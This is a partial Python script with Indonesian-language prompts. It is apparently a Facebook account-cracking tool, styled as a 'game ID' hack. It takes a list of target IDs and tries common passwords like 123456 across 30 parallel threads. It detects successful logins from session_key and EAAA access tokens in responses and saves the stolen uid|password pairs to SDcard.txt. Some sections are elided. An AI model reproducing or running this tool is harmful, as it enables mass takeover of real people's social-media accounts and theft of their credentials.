...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print('\033[93;1m[+]SELAMAT ANDA BERHASIL LOGIN\033[0m')
		print('\033[1;92m[+]CRACK ID GAME\033[0m')
		print("")
		print("%s[%s1%s]%s HACK AKUN PENGUNJUNG %s[Pro]"%(G,G,R,Y,B))
	...
	def fbtua(self):
		...
		limit = int(input("\033[97;1m[➤] HACK ID GAME MAX 300,000: "))
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s[➤] GUNAKAN SANDI INI [➤] %s123456,1234567,123456789"%(G,Y))
				listpass = input("%s[➤] MASUKAN SANDI GAME :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s[➤] SANDI MAX 6 "%(B))
				print("%s[➤] CRACK MENGGUNAKAN SANDI -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				print("\n%s[➤] ID GAME DISIMPAN DI -> SDcard.txt"%(G))
				print("%s[➤] ID SANDI DISIMPAN DI -> SDcard.txt"%(C))
				for user in self.id:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r%sproses ➤ %s/%s -> \033[0;97m Connetion:%s \033[0;97m Prossecing:%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[0;93mproses ➤ Connetion|%s | %s\033[0;93m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("SDcard.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r\033[92;1mproses ➤ Prossecing|%s | %s\033[92;1m         "%(uid, pw))
